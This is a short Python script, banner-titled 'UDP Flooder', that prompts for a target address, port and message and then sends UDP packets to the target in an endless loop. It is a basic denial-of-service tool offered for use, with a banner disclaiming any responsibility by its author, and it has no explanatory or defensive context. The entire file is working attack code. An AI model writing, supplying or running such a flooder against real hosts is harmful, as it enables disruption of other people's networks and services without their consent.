import socket
import os
import time
import sys

os.system("clear")

print("""

		---------------------------------------
		-	Welcome To The UDP Flooder    -
		- NO RESPONSIBILY Held By The Coder   -
		=======================================
""")

target = input("[*] Enter Target URL/IP: ")
port = input("[*] Enter Target Port: ")
message = input("[*] Enter Desired Message: ").encode("utf-8")


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		send = s.sendto(message,(target, int(port)))
		print ("[+] Flooding UDP Packets To " + target + " On Port " + port)
	except Exception as E:
		print(E)
		print("[!] An Error Has Occured")
		print("[!] Exiting....")
		time.sleep(3)
		sys.exit()
